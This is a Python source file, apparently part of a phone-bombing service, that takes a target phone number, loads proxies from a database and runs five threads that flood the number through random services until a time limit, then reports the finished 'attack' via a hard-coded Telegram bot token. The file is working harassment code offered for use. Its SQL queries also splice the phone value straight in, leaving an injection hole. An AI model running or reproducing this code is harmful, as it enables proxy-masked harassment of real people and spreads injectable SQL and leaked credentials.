import sys, os, pyfiglet
import sqlite3
from StructService import Distribution_Service
from threading import Thread
import time
from config import connect
import telebot


def start(phone, proxies, colvo_timee, userid):
	attack_number_phone.phone(phone)
	while True:
		if time.time() <= float(colvo_timee):
			try:
				attack_number_phone.random_service(proxies)
			except Exception as ex:
				print(ex)
		else:
			connection,q = connect()
			q.execute(f'SELECT status FROM ugc_spam where phone = "{phone}" ORDER BY id DESC')
			row = q.fetchone()[0]
			print(row)
			if row == '0':
				break
			else:
				q.execute(f"update ugc_spam set status = '0' where phone = '{phone}'")
				connection.commit()
				telebot.TeleBot('1549307401:AAFk-6aNZNm6xBPD1CCON4TJ3YOOl-aFM8Q').send_message(userid, f'Закончили атаку {phone}')
				break
					
def main(phone,colvo_timee, userid):
	global attack_number_phone
	print(f'start - {phone}')
	attack_number_phone = Distribution_Service()
	phone = phone
	attack_number_phone.phone(phone)
	threads = 5
	connection,q = connect()
	q.execute(f'SELECT * FROM ugc_proxy_list where activ = "1" LIMIT {threads}')
	row = q.fetchall()
	for i in row:
		proxies = {'https': f'https://{i[5]}@{i[2]}:{i[3]}'}
		print(proxies)
		th = Thread(target=start, args=(phone,proxies, colvo_timee, userid))
		th.start()
